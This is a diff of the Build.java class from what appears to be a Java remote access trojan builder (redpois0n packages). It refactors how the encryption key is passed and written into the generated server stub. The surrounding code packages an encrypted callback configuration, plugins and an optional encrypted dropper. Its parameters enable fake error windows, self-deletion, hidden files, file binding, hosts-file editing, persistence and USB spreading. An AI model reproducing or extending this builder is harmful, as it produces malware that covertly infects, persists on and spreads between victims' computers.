@@ -25,6 +25,7 @@ import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.codec.Md5;
 import com.redpois0n.common.codec.Sha1;
 import com.redpois0n.common.crypto.Crypto;
+import com.redpois0n.common.crypto.EncryptionKey;
 import com.redpois0n.crypto.FileCrypter;
 import com.redpois0n.io.Files;
 import com.redpois0n.listeners.BuildListener;
@@ -43,7 +44,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, String key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {
+	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {
 		listener.start();
 
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -119,7 +120,8 @@ public class Build {
 				}
 
 				for (String str : config.keySet()) {
-					outputStub.write(Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key));
+					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key.getKey());
+					outputStub.write(enc);
 				}
 
 				outputStub.closeEntry();
@@ -149,7 +151,7 @@ public class Build {
 			try {
 				entry = new ZipEntry("key.dat");
 				outputStub.putNextEntry(entry);
-				outputStub.write(key.getBytes("UTF-8"));
+				outputStub.write(key.getKey());
 				outputStub.closeEntry();
 			} catch (Exception ex) {
 				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
@@ -198,7 +200,7 @@ public class Build {
 				entry = new ZipEntry("plugins.dat");
 				outputStub.putNextEntry(entry);
 				for (int i = 0; i < plugins.length; i++) {
-					outputStub.write((Crypto.encrypt(plugins[i], key) + ",").getBytes("UTF-8"));
+					outputStub.write((Crypto.encrypt(plugins[i], key.getKey()) + ",").getBytes("UTF-8"));
 				}
 				outputStub.closeEntry();
 			}
@@ -208,8 +210,7 @@ public class Build {
 
 			if (dropper) {
 				listener.reportProgress(50, "Writing server into dropper", BuildStatus.INFO);
-				String installerKey = key;
-
+				byte[] installerKey = key.getKey();
 				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
 
 				inputStub = new ZipFile(Files.getInstaller());
@@ -295,7 +296,7 @@ public class Build {
 
 			listener.done("Saved Server. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");
 
-			FrameSummary frame = new FrameSummary(file, ip, port, pass, key, ID, listener.getStatuses());
+			FrameSummary frame = new FrameSummary(file, ip, port, pass, ID, listener.getStatuses());
 			frame.setVisible(true);
 		} catch (Exception ex) {
 			String message = ex.getMessage();
